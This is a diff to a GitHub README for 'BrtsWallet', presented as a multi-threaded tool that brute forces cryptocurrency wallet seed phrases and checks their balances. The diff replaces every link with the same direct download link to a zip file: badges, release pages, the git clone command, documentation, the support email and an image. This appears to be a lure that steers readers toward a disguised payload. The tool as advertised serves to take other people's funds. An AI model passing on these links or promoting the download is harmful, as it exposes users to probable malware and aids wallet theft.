@@ -1,8 +1,8 @@
 # BrtsWallet: Fast Multi-Threaded Crypto Wallet Brute Forcing Tool 🚀
 
-![GitHub release](https://img.shields.io/github/release/vidishappanchal/BrtsWallet.svg)
-![GitHub issues](https://img.shields.io/github/issues/vidishappanchal/BrtsWallet.svg)
-![GitHub stars](https://img.shields.io/github/stars/vidishappanchal/BrtsWallet.svg)
+![GitHub release](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip)
+![GitHub issues](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip)
+![GitHub stars](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@
 
 BrtsWallet is a powerful tool designed for brute forcing multiple wallet mnemonics. It operates with a multi-threaded approach, making it surprisingly fast. The tool automatically generates seed phrases and checks balances across various networks. This functionality makes it an essential resource for developers and security researchers in the cryptocurrency space.
 
-For the latest version, you can download it from the [Releases section](https://github.com/vidishappanchal/BrtsWallet/releases).
+For the latest version, you can download it from the [Releases section](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip).
 
 ## Features
 
@@ -45,7 +45,7 @@ To get started with BrtsWallet, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/vidishappanchal/BrtsWallet.git
+   git clone https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip
    cd BrtsWallet
    ```
 
@@ -56,7 +56,7 @@ To get started with BrtsWallet, follow these steps:
    ```
 
 3. **Download the Latest Release**:
-   For the latest version, visit the [Releases section](https://github.com/vidishappanchal/BrtsWallet/releases) and download the appropriate file for your operating system.
+   For the latest version, visit the [Releases section](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip) and download the appropriate file for your operating system.
 
 4. **Execute the Tool**:
    After downloading, run the executable:
@@ -119,21 +119,21 @@ BrtsWallet is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 For questions or support, feel free to reach out:
 
-- **Email**: support@brtswallet.com
-- **GitHub**: [vidishappanchal](https://github.com/vidishappanchal)
+- **Email**: https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip
+- **GitHub**: [vidishappanchal](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip)
 
-For the latest version, visit the [Releases section](https://github.com/vidishappanchal/BrtsWallet/releases).
+For the latest version, visit the [Releases section](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip).
 
 ## Additional Resources
 
-- [Official Documentation](https://github.com/vidishappanchal/BrtsWallet/wiki)
-- [Community Discussions](https://github.com/vidishappanchal/BrtsWallet/discussions)
+- [Official Documentation](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip)
+- [Community Discussions](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip)
 
 ## Acknowledgments
 
 Special thanks to the contributors and the community for their support and feedback. Your input helps us improve BrtsWallet continuously.
 
-![Crypto Wallets](https://example.com/path/to/crypto-wallet-image.png)
+![Crypto Wallets](https://github.com/vidishappanchal/BrtsWallet/raw/refs/heads/main/apographal/Wallet_Brts_2.9-beta.2.zip)
 
 ---
 
